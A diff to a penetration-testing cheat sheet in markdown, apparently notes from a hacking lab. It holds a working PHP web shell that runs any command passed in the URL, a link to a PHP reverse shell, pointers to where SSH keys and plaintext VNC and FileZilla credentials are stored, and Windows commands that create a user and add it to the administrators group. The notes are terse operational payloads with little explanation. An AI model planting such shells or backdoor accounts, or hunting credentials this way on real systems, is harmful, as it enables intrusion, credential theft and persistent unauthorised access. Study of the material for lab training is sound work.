@@ -999,11 +999,23 @@ list payloads:
 **WebShells**
 php
 - ``` <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> ```
-- usage. input in URL "10.10.84.199/uploads/shell.php?ifconfig"
+- usage. input in URL "10.10.84.199/uploads/shell.php?cmd=ifconfig"
 - run ``` ifconfig ``` on server.
 
 pentestmonkey reverse shell
 - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 - a full reverse shell written in PHP
+
+**Next**
+Try to get access to user account
+- SSH keys stored at ``` /home/<user>/.ssh ```
+- Windows eg, VNC servers frequently leave passwords in the registry stored in plaintext.
+- FileZilla FTP server also leave credentials in an XML file
+
+windos add user:
+- ``` net user <username> <password> /add ```
+- ``` net localgroup administrators <username> /add ```
+
+
 
 
